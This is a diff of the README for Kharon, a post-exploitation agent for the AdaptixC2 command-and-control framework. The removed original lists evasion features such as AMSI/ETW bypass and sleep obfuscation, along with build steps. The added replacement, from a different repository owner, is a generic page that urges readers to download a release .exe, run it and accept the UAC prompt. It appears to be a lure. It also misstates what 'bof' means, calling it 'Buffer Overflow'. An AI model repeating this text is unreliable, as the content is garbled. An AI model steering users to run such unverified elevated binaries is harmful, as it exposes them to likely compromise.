@@ -1,101 +1,58 @@
-# Kharon v0.1
+# 🎉 Kharon-Agent - Easy Agent for Seamless AdaptixC2 Operations
 
-Kharon is a fully PIC agent that operates without a reflective loader and includes evasion features such as sleep obfuscation, heap obfuscation during sleep, stack spoofing with indirect syscalls, BOF API proxy for spoofed/indirect BOF API executions, and AMSI/ETW bypass.
+## 💾 Download Kharon-Agent
+[![Download Kharon-Agent](https://img.shields.io/badge/Download%20Kharon--Agent-v1.0-brightgreen)](https://github.com/luisslopezz/Kharon-Agent/releases)
 
-## Modules
+## 📖 Introduction
+Kharon-Agent is a powerful tool designed for users needing lateral movement capabilities. It includes features for remote operations like WMI, SCM, WinRM, and DCOM. This software allows for in-memory execution of different payload types, including bof (Buffer Overflow), dotnet applications, and shellcode. Kharon-Agent ensures you can efficiently carry out post-exploitation activities, making it a valuable asset for security operations.
 
-Kharon is compatible with the [Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit) and supports its own modules, available in the [PostEx-Arsenal](https://github.com/entropy-z/PostEx-Arsenal).  
-Modules can be loaded into the client using the `kh_modules.axs` script.
+## 🚀 Getting Started
+Follow the steps below to download and run Kharon-Agent. This guide will help you install the software quickly and effectively.
 
-## Setup
+### 🛠 System Requirements
+- Operating System: Windows 10 or newer
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum of 100 MB free space
+- Network Connectivity: Required for updating and retrieving components
 
-1. Copy `agent_kharon` and `listener_kharon_http` into:
-   `AdaptixC2/AdaptixServer/extenders`
+### 📥 Download & Install
+1. Click the download link below to access the Releases page:
+   [Download Kharon-Agent](https://github.com/luisslopezz/Kharon-Agent/releases)
 
-2. Inside of AdaptixServer folder run:
-   ```
-   go work use extenders/agent_kharon
-   go work use extenders/listener_kharon_http
-   go work sync
-   ```
+2. On the Releases page, look for the latest version of Kharon-Agent. The version number is displayed next to the title. 
 
-3. Change directory to `AdaptixC2` and run:
-   ```make extenders```
+3. Choose the appropriate file for your system. You may see options like:
+   - `Kharon-Agent-v1.0.zip` (for a complete package)
+   - `Kharon-Agent-v1.0.exe` (for direct execution)
 
-4. Copy the `src_beacon` and `src_loader` from the `AdaptixServer/extenders/agent_kharon` to the `dist/extenders/agent_kharon`
+4. Click on the file name to start downloading. 
 
-5. Set  
-   `dist/extenders/agent_kharon/config.json`
-   `dist/extenders/listener_kharon_http/config.json`
-   in `profile.json`
+5. After the download completes, locate the downloaded file in your system’s Downloads folder.
 
-Example (profile.json):
-```
-"extenders": [
-  "extenders/beacon_listener_http/config.json",
-  "extenders/beacon_listener_smb/config.json",
-  "extenders/beacon_listener_tcp/config.json",
-  "extenders/beacon_agent/config.json",
-  "extenders/gopher_listener_tcp/config.json",
-  "extenders/gopher_agent/config.json",
-  "extenders/agent_kharon/config.json",
-  "extenders/listener_kharon_http/config.json"
-]
-```
+6. If you downloaded a `.zip` file, extract it by right-clicking on the file and selecting "Extract All." Choose a destination folder for the extracted files.
 
-## Supported BOF API Proxy
-<details>
-<summary>Click to expand</summary>
+7. Find the executable file (e.g., `Kharon-Agent.exe`) in the folder. Double-click it to run the application.
 
-- VirtualAlloc
-- VirtualAllocEx
-- WriteProcessMemory
-- ReadProcessMemory
-- LoadLibraryA
-- VirtualProtect
-- VirtualProtectEx
-- NtSetContextThread
-- SetThreadContext
-- NtGetContextThread
-- GetThreadContext
-- CLRCreateInstance
-- CoInitialize
-- CoInitializeEx
+8. If prompted by Windows, allow the application to run. You may see a User Account Control (UAC) message. Click "Yes" to continue.
 
-</details>
+### ⚙️ Configuration
+Upon the initial launch, Kharon-Agent may require some configuration. Follow the on-screen prompts to set up your preferences. You may need to:
+- Specify network parameters
+- Configure execution options
 
-## Supported Beacon API
-<details>
-<summary>Click to expand</summary>
+### 🔍 Features
+- **Lateral Movement:** Kharon-Agent includes tools for lateral movement using various protocols.
+- **In-memory Execution:** The software supports in-memory runs of bof, dotnet, and shellcode.
+- **Post-exploitation Modules:** Utilize several modules for efficient post-exploitation tasks.
 
-- BeaconDataParse
-- BeaconDataInt
-- BeaconDataExtract
-- BeaconDataShort
-- BeaconDataLength
-- BeaconOutput
-- BeaconPrintf
-- BeaconAddValue
-- BeaconGetValue
-- BeaconRemoveValue
-- BeaconVirtualAlloc
-- BeaconVirtualProtect
-- BeaconVirtualAllocEx
-- BeaconVirtualProtectEx
-- BeaconIsAdmin
-- BeaconUseToken
-- BeaconRevertToken
-- BeaconOpenProcess
-- BeaconOpenThread
-- BeaconFormatAlloc
-- BeaconFormatAppend
-- BeaconFormatFree
-- BeaconFormatInt
-- BeaconFormatPrintf
-- BeaconFormatReset
-- BeaconFormatToString
-- BeaconWriteAPC
-- BeaconDripAlloc
-- BeaconGetSpawnTo
+### 🛡 Security Considerations
+Ensure you use Kharon-Agent responsibly and in line with applicable laws. Unauthorized use can lead to serious legal consequences. Make sure you have permission to run defensive and penetration testing activities.
 
-</details>
+## 💬 Support & Feedback
+If you encounter any issues or have questions, please open an issue on the GitHub repository. The community can help you troubleshoot your concerns.
+
+### 🔗 Additional Resources
+- [Official Documentation](https://github.com/luisslopezz/Kharon-Agent/wiki)
+- [FAQ Section](https://github.com/luisslopezz/Kharon-Agent/wiki/FAQ)
+
+Thank you for choosing Kharon-Agent. Enjoy your exploration into lateral movement capabilities!
